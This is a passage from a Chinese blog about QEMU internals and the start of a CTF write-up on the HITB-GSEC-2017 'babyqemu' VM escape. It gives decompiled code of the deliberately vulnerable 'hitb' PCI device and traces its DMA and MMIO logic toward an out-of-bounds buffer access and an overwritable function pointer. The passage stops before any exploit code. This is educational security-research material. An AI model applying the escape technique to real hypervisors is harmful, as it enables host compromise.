function(void)，所以上面的函数指针为啥都是do_qemu_init_开头很清楚了吧 12345678910111213#define module_init(function, type) \\static void __attribute__((constructor)) do_qemu_init_ ## function(void) \\&#123; \\ register_dso_module_init(function, type); \\&#125;#else/* This should not be used directly. Use block_init etc. instead. */#define module_init(function, type) \\static void __attribute__((constructor)) do_qemu_init_ ## function(void) \\&#123; \\ register_module_init(function, type); \\&#125;#endif 之后register_module_init这些之前都讲过了，就将后面的pci_hitb_register_types函数指针赋值给ModuleEntry中的init成员并插到了一个ModuleTypeList，而main函数会调用ModuleTypeList中的ModuleTypeList中的ModuleEntry的init函数，也即这里的pci_hitb_register_types 接下来pci_hitb_register_types会调用type_register_static，参数hitb_info_27046就是一个TypeInfo类型 __cdecl do_qemu_init_pci_hitb_register_types()12345678&#123; register_module_init((void (*)(void))pci_hitb_register_types, MODULE_INIT_QOM_0);&#125;void __cdecl pci_hitb_register_types()&#123; type_register_static(&amp;hitb_info_27046);&#125; 里面初始化了instance_init和class_init成员，分别是hitb_instance_init和hitb_class_init（ObjectClass的初始化的时候会调用hitb_class_init，而Object初始化的时候会调用instance_init） 12345678910111213141516data.rel.ro:0000000000969020 hitb_info_27046 dq offset aHitb ; name.data.rel.ro:0000000000969020 ; DATA XREF: pci_hitb_register_types↑o.data.rel.ro:0000000000969020 dq offset aVirtioPciDevic+7; parent ; &quot;hitb&quot; ....data.rel.ro:0000000000969020 dq 1BD0h ; instance_size.data.rel.ro:0000000000969020 dq offset hitb_instance_init; instance_init.data.rel.ro:0000000000969020 dq 0 ; instance_post_init.data.rel.ro:0000000000969020 dq 0 ; instance_finalize.data.rel.ro:0000000000969020 db 0 ; abstract.data.rel.ro:0000000000969020 db 7 dup(0).data.rel.ro:0000000000969020 dq 0 ; class_size.data.rel.ro:0000000000969020 dq offset hitb_class_init; class_init.data.rel.ro:0000000000969020 dq 0 ; class_base_init.data.rel.ro:0000000000969020 dq 0 ; class_finalize.data.rel.ro:0000000000969020 dq 0 ; class_data.data.rel.ro:0000000000969020 dq 0 ; interfaces.data.rel.ro:0000000000969088 align 20h 到这里整个流程已经清楚了，但是唯一不清楚的就是hitb_class_init中的pci_hitb_realize是什么时候调用的 1234567891011121314151617void __fastcall hitb_class_init(ObjectClass_0 *a1, void *data)&#123; __int64 v2; // rax v2 = (__int64)object_class_dynamic_cast_assert( a1, &quot;pci-device&quot;, &quot;/mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/hw/misc/hitb.c&quot;, 469, &quot;hitb_class_init&quot;); *(_BYTE *)(v2 + 236) = 0x10; *(_WORD *)(v2 + 238) = 0xFF; *(_QWORD *)(v2 + 192) = pci_hitb_realize; *(_QWORD *)(v2 + 208) = pci_hitb_uninit; *(_WORD *)(v2 + 232) = 0x1234; *(_WORD *)(v2 + 234) = 0x2333; // device_id&#125; pci_hitb_realize什么时候调用接下来调试看看pci_hitb_realize什么时候调用，先看hitb_class_init（我能说调试比看代码方便多了么。。。，整个调用关系一目了然，害我上面看代码看了这么旧，不过其实也值得） 12345678910111213Breakpoint hitb_class_initgdb-peda$ bt#0 hitb_class_init (class=0x5555565ac390, data=0x0) at /mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/hw/misc/hitb.c:469#1 0x0000555555a16b0d in type_initialize (ti=0x555556555630) at /mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/qom/object.c:817#2 object_class_foreach_tramp (key=&lt;optimized out&gt;, value=0x555556555630, opaque=0x7fffffffe100) at /mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/qom/object.c:804#3 0x00007ffff6add340 in g_hash_table_foreach () from /lib/x86_64-linux-gnu/libglib-2.0.so.0#4 0x0000555555a16fc8 in object_class_foreach (fn=fn@entry=0x555555a159e0 &lt;object_class_get_list_tramp&gt;, implements_type=&lt;optimized out&gt;, include_abstract=&lt;optimized out&gt;, opaque=opaque@entry=0x7fffffffe140) at /mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/qom/object.c:826#5 0x0000555555a17062 in object_class_get_list (implements_type=&lt;optimized out&gt;, include_abstract=&lt;optimized out&gt;) at /mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/qom/object.c:880#6 0x000055555588987f in find_default_machine () at /mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/vl.c:1488#7 0x0000555555755904 in select_machine () at /mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/vl.c:2745#8 main (argc=argc@entry=0x13, argv=argv@entry=0x7fffffffe4d8, envp=&lt;optimized out&gt;) at /mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/vl.c:4113#9 0x00007ffff5db6830 in __libc_start_main (main=0x555555755410 &lt;main&gt;, argc=0x13, argv=0x7fffffffe4d8, init=&lt;optimizedout&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffe4c8) at ../csu/libc-start.c:291#10 0x000055555575cca9 in _start () 接下来看pci_hitb_realize，可以看到是qdev_device_add函数里面的object_property_set_bool(OBJECT(dev), true, &quot;realized&quot;, &amp;err);，而且是在object_new之后，也就是说Object实例化后才调用class_init函数中设置的realize函数指针 代码：https://github.com/qemu/qemu/blob/dd5b0f95490883cd8bc7d070db8de70d5c979cbc/qdev-monitor.c#L675 1234567891011121314Breakpoint pci_hitb_realizegdb-peda$ bt#0 pci_hitb_realize (pdev=0x555557f845a0, errp=0x7fffffffde60) at /mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/hw/misc/hitb.c:410#1 0x0000555555962034 in pci_qdev_realize (qdev=0x555557f845a0, errp=&lt;optimized out&gt;) at /mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/hw/pci/pci.c:2002#2 0x00005555558e5f3d in device_set_realized (obj=&lt;optimized out&gt;, value=&lt;optimized out&gt;, errp=0x7fffffffe018) at /mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/hw/core/qdev.c:907#3 0x0000555555a15d3e in property_set_bool (obj=0x555557f845a0, v=&lt;optimized out&gt;, name=&lt;optimized out&gt;, opaque=0x555557f861f0, errp=0x7fffffffe018) at /mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/qom/object.c:1887#4 0x0000555555a19d6f in object_property_set_qobject (obj=obj@entry=0x555557f845a0, value=value@entry=0x555557f86e10, name=name@entry=0x555555b4b98b &quot;realized&quot;, errp=errp@entry=0x7fffffffe018) at /mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/qom/qom-qobject.c:27#5 0x0000555555a17a60 in object_property_set_bool (obj=0x555557f845a0, value=&lt;optimized out&gt;, name=0x555555b4b98b &quot;realized&quot;, errp=0x7fffffffe018) at /mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/qom/object.c:1162#6 0x0000555555885799 in qdev_device_add (opts=0x5555565845b0, errp=0x7fffffffe0f0) at /mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/qdev-monitor.c:630#7 0x0000555555887b37 in device_init_func (opaque=&lt;optimized out&gt;, opts=&lt;optimized out&gt;, errp=&lt;optimized out&gt;) at /mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/vl.c:2334#8 0x0000555555ae09ca in qemu_opts_foreach (list=&lt;optimized out&gt;, func=0x555555887b10 &lt;device_init_func&gt;, opaque=0x0, errp=0x0) at /mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/util/qemu-option.c:1104#9 0x0000555555756822 in main (argc=argc@entry=0x13, argv=argv@entry=0x7fffffffe4d8, envp=&lt;optimized out&gt;) at /mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/vl.c:4648#10 0x00007ffff5db6830 in __libc_start_main (main=0x555555755410 &lt;main&gt;, argc=0x13, argv=0x7fffffffe4d8, init=&lt;optimizedout&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffe4c8) at ../csu/libc-start.c:291#11 0x000055555575cca9 in _start () 根据栈，我跟了下代码，还是比较复杂的，有兴趣的也可以去跟一下 总结基础知识基本上都是搬运别人的知识，到后面源码阅读从参考别人，到自己去跟，学到很多。其实调试会更加高效，而且没有参考文章的时候，你也可以找到一些蛛丝马迹 参考http://blog.vmsplice.net/2011/03/qemu-internals-big-picture-overview.htmlhttp://phrack.org/papers/vm-escape-qemu-case-study.htmlhttps://www.giantbranch.cn/2019/12/03/CTF%20QEMU%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E4%B9%8BBlizzardCTF%202017%20Strng/https://www.kernel.org/doc/Documentation/vm/pagemap.txthttps://cloud.tencent.com/developer/article/1018022https://my.oschina.net/u/3626804/blog/1822539http://liujunming.top/2019/07/19/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9C%BC%E4%B8%AD%E7%9A%84PCI%E8%AE%BE%E5%A4%87/http://www.mnc.co.jp/english/INtime/faq07-2_kanren/PCIconfigurationregister.htmhttps://ray-cp.github.io/archivers/qemu-pwn-basic-knowledgehttps://www.w0lfzhang.com/2018/11/02/How-QEMU-Emulates-Devices/https://blog.csdn.net/u011364612/article/details/53485856https://www.binss.me/blog/qemu-note-of-qemu-object-model/https://juniorprincewang.github.io/2018/07/23/qemu%E6%BA%90%E7%A0%81%E6%B7%BB%E5%8A%A0%E8%AE%BE%E5%A4%87/https://www.cnblogs.com/etangyushan/p/6077307.htmlhttps://developer.gnome.org/glib/stable/glib-Hash-Tables.htmlhttps://terenceli.github.io/%E6%8A%80%E6%9C%AF/2017/01/08/qom-introductionhttps://developer.gnome.org/glib/stable/glib-Singly-Linked-Lists.htmlhttps://terenceli.github.io/%E6%8A%80%E6%9C%AF/2015/09/26/qemu-optionshttps://sq.163yun.com/blog/article/175668619278782464https://www.cnblogs.com/anker/p/3462363.htmlhttps://www.jianshu.com/p/dd425b9dc9dbhttps://www.anquanke.com/post/id/86412http://www.voidcn.com/article/p-bxeqwthp-n.htmlhttp://answerrrrrrrrr.github.io/2017/03/16/Linux%E7%A8%8B%E5%BA%8F%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/https://refspecs.linuxbase.org/LSB_3.1.0/LSB-generic/LSB-generic/baselib---libc-start-main-.htmlhttps://github.com/bminor/glibc/blob/653d74f12abea144219af00400ed1f1ac5dfa79f/csu/libc-start.c#L128","categories":[],"tags":[{"name":"qemu","slug":"qemu","permalink":"https://www.giantbranch.cn/tags/qemu/"}]},{"title":"CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu","slug":"CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu","date":"2020-01-02T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2020/01/02/CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu/","link":"","permalink":"https://www.giantbranch.cn/2020/01/02/CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu/","excerpt":"","text":"熟悉题目，顺便介绍基础知识先看启动脚本，基本就是hitb的设备的漏洞了 12345678910#! /bin/sh./qemu-system-x86_64 \\-initrd ./rootfs.cpio \\-kernel ./vmlinuz-4.8.0-52-generic \\-append &apos;console=ttyS0 root=/dev/ram oops=panic panic=1&apos; \\-enable-kvm \\-monitor /dev/null \\-m 64M --nographic -L ./dependency/usr/local/shar e/qemu \\-L pc-bios \\-device hitb,id=vda 发现root登录都不用密码的 我们用ida载入，由于有符号的，函数那直接搜索hitb就出现相关函数了，通过初始化函数即下面的init函数可以看到device id是0x2333（记住WORD1这个是device id就行），还有设置了pci_hitb_realize也是初始化的，pci_hitb_uninit就是跟pci_hitb_realize相反的操作，进行destroy，del等操作 1234567891011121314151617void __fastcall hitb_class_init(ObjectClass_0 *a1, void *data)&#123; ObjectClass_0 *v2; // rax v2 = object_class_dynamic_cast_assert( a1, &quot;pci-device&quot;, &quot;/mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/hw/misc/hitb.c&quot;, 469, &quot;hitb_class_init&quot;); BYTE4(v2[2].object_cast_cache[3]) = 0x10; HIWORD(v2[2].object_cast_cache[3]) = 0xFF; v2[2].type = (Type)pci_hitb_realize; v2[2].object_cast_cache[0] = (const char *)pci_hitb_uninit; LOWORD(v2[2].object_cast_cache[3]) = 0x1234; WORD1(v2[2].object_cast_cache[3]) = 0x2333; // device_id&#125; ida在local type那里可以搜索hitb，可以看到设备的数据结构 123456789101112131415161718struct __attribute__((aligned(16))) HitbState&#123; PCIDevice_0 pdev; MemoryRegion_0 mmio; QemuThread_0 thread; QemuMutex_0 thr_mutex; QemuCond_0 thr_cond; _Bool stopping; uint32_t addr4; uint32_t fact; uint32_t status; uint32_t irq_status; dma_state dma; QEMUTimer_0 dma_timer; char dma_buf[4096]; void (*enc)(char *, unsigned int); uint64_t dma_mask;&#125;; 在struct那里有偏移会好点 123456789101112131415161718192021222324252627282930313200000000 HitbState struc ; (sizeof=0x1BD0, align=0x10, copyof_1493)00000000 pdev PCIDevice_0 ?000009F0 mmio MemoryRegion_0 ?00000AF0 thread QemuThread_0 ?00000AF8 thr_mutex QemuMutex_0 ?00000B20 thr_cond QemuCond_0 ?00000B50 stopping db ?00000B51 db ? ; undefined00000B52 db ? ; undefined00000B53 db ? ; undefined00000B54 addr4 dd ?00000B58 fact dd ?00000B5C status dd ?00000B60 irq_status dd ?00000B64 db ? ; undefined00000B65 db ? ; undefined00000B66 db ? ; undefined00000B67 db ? ; undefined00000B68 dma dma_state ?00000B88 dma_timer QEMUTimer_0 ?00000BB8 dma_buf db 4096 dup(?)00001BB8 enc dq ? ; offset00001BC0 dma_mask dq ?00001BC8 db ? ; undefined00001BC9 db ? ; undefined00001BCA db ? ; undefined00001BCB db ? ; undefined00001BCC db ? ; undefined00001BCD db ? ; undefined00001BCE db ? ; undefined00001BCF db ? ; undefined00001BD0 HitbState ends 还有两个相关的 123456789101112131415161718192021222300000000 dma_state struc ; (sizeof=0x20, align=0x8, copyof_1491)00000000 ; XREF: HitbState/r00000000 src dq ?00000008 dst dq ?00000010 cnt dq ?00000018 cmd dq ?00000020 dma_state ends0000002000000000 ; ---------------------------------------------------------------------------0000000000000000 QEMUTimer_0 struc ; (sizeof=0x30, align=0x8, copyof_529)00000000 ; XREF: HitbState/r00000000 expire_time dq ?00000008 timer_list dq ? ; offset00000010 cb dq ? ; offset00000018 opaque dq ? ; offset00000020 next dq ? ; offset00000028 scale dd ?0000002C db ? ; undefined0000002D db ? ; undefined0000002E db ? ; undefined0000002F db ? ; undefined00000030 QEMUTimer_0 ends 看一下pci_hitb_realize， 12345678910111213void __fastcall pci_hitb_realize(HitbState *pdev, Error_0 **errp)&#123; pdev-&gt;pdev.config[61] = 1; if ( !msi_init(&amp;pdev-&gt;pdev, 0, 1u, 1, 0, errp) ) &#123; timer_init_tl(&amp;pdev-&gt;dma_timer, main_loop_tlg.tl[1], 1000000, (QEMUTimerCB *)hitb_dma_timer, pdev); qemu_mutex_init(&amp;pdev-&gt;thr_mutex); qemu_cond_init(&amp;pdev-&gt;thr_cond); qemu_thread_create(&amp;pdev-&gt;thread, &quot;hitb&quot;, (void *(*)(void *))hitb_fact_thread, pdev, 0); memory_region_init_io(&amp;pdev-&gt;mmio, &amp;pdev-&gt;pdev.qdev.parent_obj, &amp;hitb_mmio_ops, pdev, &quot;hitb-mmio&quot;, 0x100000uLL); pci_register_bar(&amp;pdev-&gt;pdev, 0, 0, &amp;pdev-&gt;mmio); &#125;&#125; timer_init_tl设置了&amp;pdev-&gt;dma_timer的回调函数是hitb_dma_timer，回调函数的参数是pdev，理解来源于下面qemu的源码及注释，而倒数第二行memory_region_init_io函数就是初始化内存映射IO，指定了MMIO的操作&amp;hitb_mmio_ops（这个的read和write分别指向hitb_mmio_read，hitb_mmio_write），最后pci_register_bar将&amp;pdev-&gt;mmio注册到qemu PCI设备的BAR（Base Address Registers，BAR记录了设备所需要的地址空间的类型，基址以及其他属性。），其中第二个参数0，代表注册的是MMIO，假如是1就代表注册PMIO 123456789101112131415161718192021222324/** * timer_init_tl: * @ts: the timer to be initialised * @timer_list: the timer list to attach the timer to * @scale: the scale value for the timer * @cb: the callback to be called when the timer expires * @opaque: the opaque pointer to be passed to the callback * * Initialise a new timer and associate it with @timer_list. * The caller is responsible for allocating the memory. * * You need not call an explicit deinit call. Simply make * sure it is not on a list with timer_del. */void timer_init_tl(QEMUTimer *ts, QEMUTimerList *timer_list, int scale, QEMUTimerCB *cb, void *opaque)&#123; ts-&gt;timer_list = timer_list; ts-&gt;cb = cb; ts-&gt;opaque = opaque; ts-&gt;scale = scale; ts-&gt;expire_time = -1;&#125; 我们回过头来看看pci设备，根据id，就知道是最后一个了，这个系统太mini了，lspci -v看不到任何详细的信息 12345678# lspci00:00.0 Class 0600: 8086:123700:01.3 Class 0680: 8086:711300:03.0 Class 0200: 8086:100e00:01.1 Class 0101: 8086:701000:02.0 Class 0300: 1234:111100:01.0 Class 0601: 8086:700000:04.0 Class 00ff: 1234:2333 那我们去看文件系统中的，可以看到MMIO的信息，起始地址是0x00000000fea00000，根据第二个地址，size可算出是0x100000这么大 1234567891011121314# cat /sys/devices/pci0000\\:00/0000:00\\:04.0/resource0x00000000fea00000 0x00000000feafffff 0x00000000000402000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x0000000000000000 其实除了hitb_class_init，还有hitb_instance_init初始化函数，他们都在hitb_info_27046中 123456789101112131415161718.data.rel.ro:0000000000969020 ; Function-local static variable.data.rel.ro:0000000000969020 ; const TypeInfo_0 hitb_info_27046.data.rel.ro:0000000000969020 hitb_info_27046 dq offset aHitb ; name.data.rel.ro:0000000000969020 ; DATA XREF: pci_hitb_register_types↑o.data.rel.ro:0000000000969020 dq offset aVirtioPciDevic+7; parent ; &quot;hitb&quot; ....data.rel.ro:0000000000969020 dq 1BD0h ; instance_size.data.rel.ro:0000000000969020 dq offset hitb_instance_init; instance_init.data.rel.ro:0000000000969020 dq 0 ; instance_post_init.data.rel.ro:0000000000969020 dq 0 ; instance_finalize.data.rel.ro:0000000000969020 db 0 ; abstract.data.rel.ro:0000000000969020 db 7 dup(0).data.rel.ro:0000000000969020 dq 0 ; class_size.data.rel.ro:0000000000969020 dq offset hitb_class_init; class_init.data.rel.ro:0000000000969020 dq 0 ; class_base_init.data.rel.ro:0000000000969020 dq 0 ; class_finalize.data.rel.ro:0000000000969020 dq 0 ; class_data.data.rel.ro:0000000000969020 dq 0 ; interfaces.data.rel.ro:0000000000969088 align 20h 而hitb_instance_init主要是初始化了HitbState-&gt;enc为函数指针hitb_enc 注：v1 += 0x1BC0 为dma_mask的偏移，减8就是enc的偏移了 1234567891011121314151617181920212223void __fastcall hitb_instance_init(Object_0 *obj)&#123; __int64 v1; // rax v1 = (__int64)object_dynamic_cast_assert( obj, &quot;hitb&quot;, &quot;/mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/hw/misc/hitb.c&quot;, 459, &quot;hitb_instance_init&quot;); *(_QWORD *)(v1 + 0x1BC0) = 0xFFFFFFFLL; v1 += 0x1BC0LL; *(_QWORD *)(v1 - 8) = hitb_enc; object_property_add( obj, &quot;dma_mask&quot;, &quot;uint64&quot;, (ObjectPropertyAccessor *)hitb_obj_uint64, (ObjectPropertyAccessor *)hitb_obj_uint64, 0LL, (void *)v1, 0LL);&#125; 最后抛开题目，看看这两个init函数是怎么调用的，向上回溯发现从头到尾的调用是这样的，首先是_start函数，调用libc_start_main，再调用libc_csu_init，而__libc_csu_init循环调用_frame_dummy_init_array_entry[]里面的函数指针 1234567891011121314151617void __fastcall _libc_csu_init(unsigned int a1, __int64 a2, __int64 a3)&#123; __int64 v3; // r13 signed __int64 v4; // rbp __int64 v5; // rbx v3 = a3; v4 = &amp;_do_global_dtors_aux_fini_array_entry - _frame_dummy_init_array_entry; init_proc(); if ( v4 ) &#123; v5 = 0LL; do ((void (__fastcall *)(_QWORD, __int64, __int64))_frame_dummy_init_array_entry[v5++])(a1, a2, v3); while ( v5 != v4 ); &#125;&#125; 而_frame_dummy_init_array_entry[]里面的有下面的函数指针 1.init_array:0000000000964D68 dq offset do_qemu_init_pci_hitb_register_types 跟随这个路子一直走，刚好就注册了hitb_info_27046 12345678910void __cdecl do_qemu_init_pci_hitb_register_types()&#123; register_module_init((void (*)(void))pci_hitb_register_types, MODULE_INIT_QOM_0);&#125;void __cdecl pci_hitb_register_types()&#123; type_register_static(&amp;hitb_info_27046);&#125; MMIO函数read函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758uint64_t __fastcall hitb_mmio_read(HitbState *opaque, hwaddr addr, unsigned int size)&#123; uint64_t result; // rax uint64_t val; // ST08_8 result = -1LL; if ( size == 4 ) &#123; if ( addr == 128 ) return opaque-&gt;dma.src; if ( addr &gt; 0x80 ) &#123; if ( addr == 140 ) return *(dma_addr_t *)((char *)&amp;opaque-&gt;dma.dst + 4); if ( addr &lt;= 0x8C ) &#123; if ( addr == 132 ) return *(dma_addr_t *)((char *)&amp;opaque-&gt;dma.src + 4); if ( addr == 136 ) return opaque-&gt;dma.dst; &#125; else &#123; if ( addr == 144 ) return opaque-&gt;dma.cnt; if ( addr == 152 ) return opaque-&gt;dma.cmd; &#125; &#125; else &#123; if ( addr == 8 ) &#123; qemu_mutex_lock(&amp;opaque-&gt;thr_mutex); val = opaque-&gt;fact; qemu_mutex_unlock(&amp;opaque-&gt;thr_mutex); return val; &#125; if ( addr &lt;= 8 ) &#123; result = 16777453LL; if ( !addr ) return result; if ( addr == 4 ) return opaque-&gt;addr4; &#125; else &#123; if ( addr == 32 ) return opaque-&gt;status; if ( addr == 36 ) return opaque-&gt;irq_status; &#125; &#125; result = -1LL; &#125; return result;&#125; write函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192void __fastcall hitb_mmio_write(HitbState *opaque, hwaddr addr, uint64_t val, unsigned int size)&#123; uint32_t v4; // er13 int v5; // edx bool v6; // zf int64_t v7; // rax if ( (addr &gt; 0x7F || size == 4) &amp;&amp; (!((size - 4) &amp; 0xFFFFFFFB) || addr &lt;= 0x7F) ) &#123; if ( addr == 128 ) &#123; if ( !(opaque-&gt;dma.cmd &amp; 1) ) opaque-&gt;dma.src = val; &#125; else &#123; v4 = val; if ( addr &gt; 0x80 ) &#123; if ( addr == 140 ) &#123; if ( !(opaque-&gt;dma.cmd &amp; 1) ) *(dma_addr_t *)((char *)&amp;opaque-&gt;dma.dst + 4) = val; &#125; else if ( addr &gt; 0x8C ) &#123; if ( addr == 144 ) &#123; if ( !(opaque-&gt;dma.cmd &amp; 1) ) opaque-&gt;dma.cnt = val; &#125; else if ( addr == 152 &amp;&amp; val &amp; 1 &amp;&amp; !(opaque-&gt;dma.cmd &amp; 1) ) &#123; opaque-&gt;dma.cmd = val; v7 = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL_0); timer_mod( &amp;opaque-&gt;dma_timer, ((signed __int64)((unsigned __int128)(4835703278458516699LL * (signed __int128)v7) &gt;&gt; 64) &gt;&gt; 18) - (v7 &gt;&gt; 63) + 100); &#125; &#125; else if ( addr == 132 ) &#123; if ( !(opaque-&gt;dma.cmd &amp; 1) ) *(dma_addr_t *)((char *)&amp;opaque-&gt;dma.src + 4) = val; &#125; else if ( addr == 136 &amp;&amp; !(opaque-&gt;dma.cmd &amp; 1) ) &#123; opaque-&gt;dma.dst = val; &#125; &#125; else if ( addr == 32 ) &#123; if ( val &amp; 0x80 ) _InterlockedOr((volatile signed __int32 *)&amp;opaque-&gt;status, 0x80u); else _InterlockedAnd((volatile signed __int32 *)&amp;opaque-&gt;status, 0xFFFFFF7F); &#125; else if ( addr &gt; 0x20 ) &#123; if ( addr == 96 ) &#123; v6 = ((unsigned int)val | opaque-&gt;irq_status) == 0; opaque-&gt;irq_status |= val; if ( !v6 ) hitb_raise_irq(opaque, 0x60u); &#125; else if ( addr == 100 ) &#123; v5 = ~(_DWORD)val; v6 = (v5 &amp; opaque-&gt;irq_status) == 0; opaque-&gt;irq_status &amp;= v5; if ( v6 &amp;&amp; !msi_enabled(&amp;opaque-&gt;pdev) ) pci_set_irq(&amp;opaque-&gt;pdev, 0); &#125; &#125; else if ( addr == 4 ) &#123; opaque-&gt;addr4 = ~(_DWORD)val; &#125; else if ( addr == 8 &amp;&amp; !(opaque-&gt;status &amp; 1) ) &#123; qemu_mutex_lock(&amp;opaque-&gt;thr_mutex); opaque-&gt;fact = v4; _InterlockedOr((volatile signed __int32 *)&amp;opaque-&gt;status, 1u); qemu_cond_signal(&amp;opaque-&gt;thr_cond); qemu_mutex_unlock(&amp;opaque-&gt;thr_mutex); &#125; &#125; &#125;&#125; 可以看到read函数返回的都是HitbState的字段，而write函数则是对HitbState字段的写入，应该没啥漏洞，关注下write函数的下面片段，这个应该会调用opaque-&gt;dma_timer的回调函数hitb_dma_timer 12345678910else if ( addr == 152 &amp;&amp; val &amp; 1 &amp;&amp; !(opaque-&gt;dma.cmd &amp; 1) ) &#123; opaque-&gt;dma.cmd = val; v7 = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL_0); timer_mod( &amp;opaque-&gt;dma_timer, ((signed __int64)((unsigned __int128)(4835703278458516699LL * (signed __int128)v7) &gt;&gt; 64) &gt;&gt; 18) - (v7 &gt;&gt; 63) + 100); &#125; qemu_clock_get_ns获取时钟的纳秒值，timer_mod修改dma_timer的expire_time，这样应该可以触发hitb_dma_timer的调用 这两个函数定义可以看下面的链接https://github.com/qemu/qemu/blob/f2cfa1229e539ee1bb1822912075cf25538ad6b9/include/qemu/timer.h#L96https://github.com/qemu/qemu/blob/f2cfa1229e539ee1bb1822912075cf25538ad6b9/include/qemu/timer.h#L666 hitb_dma_timer我们看看hitb_dma_timer函数，看这个函数可能算是模拟了DMA（直接存储器访问），可以让我们从读写dma_buf。（看看维基百科的描述：直接内存访问（Direct Memory Access，DMA）是计算机科学中的一种内存访问技术。它允许某些电脑内部的硬件子系统（电脑外设），可以独立地直接读写系统内存，而不需中央处理器（CPU）介入处理 。） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253void __fastcall hitb_dma_timer(HitbState *opaque)&#123; dma_addr_t v1; // rax __int64 v2; // rdx uint8_t *v3; // rsi dma_addr_t v4; // rax dma_addr_t v5; // rdx uint8_t *v6; // rbp uint8_t *v7; // rbp v1 = opaque-&gt;dma.cmd; if ( v1 &amp; 1 ) &#123; if ( v1 &amp; 2 ) &#123; v2 = (unsigned int)(LODWORD(opaque-&gt;dma.src) - 0x40000); if ( v1 &amp; 4 ) &#123; v7 = (uint8_t *)&amp;opaque-&gt;dma_buf[v2]; ((void (__fastcall *)(uint8_t *, _QWORD))opaque-&gt;enc)(v7, LODWORD(opaque-&gt;dma.cnt)); v3 = v7; &#125; else &#123; v3 = (uint8_t *)&amp;opaque-&gt;dma_buf[v2]; &#125; cpu_physical_memory_rw(opaque-&gt;dma.dst, v3, opaque-&gt;dma.cnt, 1);// 1是write v4 = opaque-&gt;dma.cmd; v5 = opaque-&gt;dma.cmd &amp; 4; &#125; else &#123; v6 = (uint8_t *)&amp;opaque[-36] + (unsigned int)opaque-&gt;dma.dst - 2824; LODWORD(v3) = (_DWORD)opaque + opaque-&gt;dma.dst - 0x40000 + 3000; cpu_physical_memory_rw(opaque-&gt;dma.src, v6, opaque-&gt;dma.cnt, 0); v4 = opaque-&gt;dma.cmd; v5 = opaque-&gt;dma.cmd &amp; 4; if ( opaque-&gt;dma.cmd &amp; 4 ) &#123; v3 = (uint8_t *)LODWORD(opaque-&gt;dma.cnt); ((void (__fastcall *)(uint8_t *, uint8_t *, dma_addr_t))opaque-&gt;enc)(v6, v3, v5); v4 = opaque-&gt;dma.cmd; v5 = opaque-&gt;dma.cmd &amp; 4; &#125; &#125; opaque-&gt;dma.cmd = v4 &amp; 0xFFFFFFFFFFFFFFFELL; // 将cmd的最低位置0了 if ( v5 ) &#123; opaque-&gt;irq_status |= 0x100u; hitb_raise_irq(opaque, (uint32_t)v3); &#125; &#125;&#125; 函数更加opaque-&gt;dma.cmd选择不同的分支，但是cmd的最低bit必须为1 这里重点是两个分支，一个是cmd&amp;2==1的时候，即第二个bit为1，另一个分支则第二个bit为0 先看两个都有的cpu_physical_memory_rw，它调用的是address_space_rw 1234567891011121314151617181920void __fastcall cpu_physical_memory_rw(hwaddr addr, uint8_t *buf, int len, int is_write)&#123; int v4; // er8 MemTxAttrs_0 v5; // 0:dl.1 v4 = len; v5 = (MemTxAttrs_0)1; address_space_rw(&amp;address_space_memory, addr, v5, buf, v4, is_write != 0);&#125;MemTxResult __fastcall address_space_rw(AddressSpace_0 *as, hwaddr addr, MemTxAttrs_0 attrs, uint8_t *buf, int len, _Bool is_write)&#123; MemTxResult result; // eax if ( is_write ) result = address_space_write(as, addr, attrs, buf, len); else result = address_space_read_full(as, addr, attrs, buf, len); return result;&#125; 